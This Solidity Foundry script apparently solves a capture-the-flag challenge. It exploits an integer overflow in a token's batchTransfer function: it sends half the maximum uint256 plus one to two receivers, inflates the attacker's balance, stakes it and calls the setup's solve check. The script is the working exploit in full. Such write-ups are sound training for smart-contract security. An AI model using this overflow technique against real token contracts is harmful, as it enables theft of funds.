//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/Setup.sol";
import {Stake} from "src/Stake.sol";
import {INR} from "src/INR.sol";


contract Exploit is Script {
    address badDude;

    function run() public {
        Setup setup = Setup(0x5FbDB2315678afecb367f032d93F642f64180aa3); // local addr
        Stake stake = Stake(setup.stake());
        INR inr = INR(setup.inr());

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        badDude = vm.addr(privateKey);

        vm.startBroadcast(privateKey);

        setup.claim();
        uint256 amount = type(uint256).max / 2 + 1;
        address[] memory receivers = new address[](2); // we don't need the last address that is just to overflow
        receivers[0] = address(badDude); 
        receivers[1] = address(0);

        inr.batchTransfer(receivers, amount); 
        inr.approve(address(stake), inr.balanceOf(badDude));

        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(), "nah plz ctf god, enlight me! what's wrong my lil' boi");

        vm.stopBroadcast();
    }
}